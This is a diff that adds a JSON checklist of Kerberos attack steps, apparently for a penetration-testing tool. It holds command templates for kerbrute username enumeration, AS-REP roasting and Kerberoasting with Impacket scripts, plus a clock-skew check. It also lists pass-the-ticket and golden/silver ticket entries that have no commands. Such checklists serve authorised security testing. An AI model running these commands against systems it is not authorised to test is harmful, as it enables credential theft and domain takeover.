@@ -1,0 +1,45 @@
+{
+  "id": "kerberos",
+  "title": "Kerberos",
+  "match": {
+    "serviceTypes": ["kerberos-sec", "kerberos"]
+  },
+  "items": [
+    {
+      "id": "kerberos.userenum",
+      "title": "Username enumeration via pre-auth",
+      "hint": "",
+      "commands": ["kerbrute userenum -d $D --dc $T users.txt"]
+    },
+    {
+      "id": "kerberos.asreproast",
+      "title": "AS-REP roasting",
+      "hint": "Accounts with Kerberos pre-auth disabled",
+      "commands": ["GetNPUsers.py $D/ -usersfile users.txt -no-pass -dc-ip $T"]
+    },
+    {
+      "id": "kerberos.kerberoast",
+      "title": "Kerberoasting",
+      "hint": "Requires one valid credential",
+      "commands": ["GetUserSPNs.py $D/user -dc-ip $T -request"]
+    },
+    {
+      "id": "kerberos.clockskew",
+      "title": "Clock skew check",
+      "hint": "Kerberos auth fails past a 5 minute skew",
+      "commands": ["ntpdate -q $T"]
+    },
+    {
+      "id": "kerberos.ticketreuse",
+      "title": "Ticket reuse and pass-the-ticket",
+      "hint": "",
+      "commands": []
+    },
+    {
+      "id": "kerberos.golden",
+      "title": "Golden/silver ticket opportunity",
+      "hint": "Only after krbtgt or service account hash is captured",
+      "commands": []
+    }
+  ]
+}
